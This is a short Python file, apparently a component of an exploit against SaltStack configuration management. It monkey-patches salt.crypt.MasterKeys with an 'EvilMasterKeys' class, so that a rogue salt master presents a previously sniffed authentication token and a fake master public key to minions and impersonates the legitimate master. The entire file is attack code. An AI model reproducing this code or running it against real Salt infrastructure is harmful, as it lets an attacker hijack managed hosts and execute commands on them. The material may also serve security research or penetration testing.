"""
Monkey patch our evil salt master to serve the token we retrieved earlier
"""
import os

import salt.crypt

class EvilMasterKeys(salt.crypt.MasterKeys):
    def __init__(self, opts):
        super(EvilMasterKeys, self).__init__(opts)

        token_path = os.path.join(self.opts['pki_dir'], 'token')
        self.token = open(token_path).read()

    def get_pub_str(self):
        """
        Return the public key of the master who's token we sniffed
        """
        fake_key_path = os.path.join(self.opts['pki_dir'], 'fake_master.pub')
        return open(fake_key_path).read()

salt.crypt.MasterKeys = EvilMasterKeys
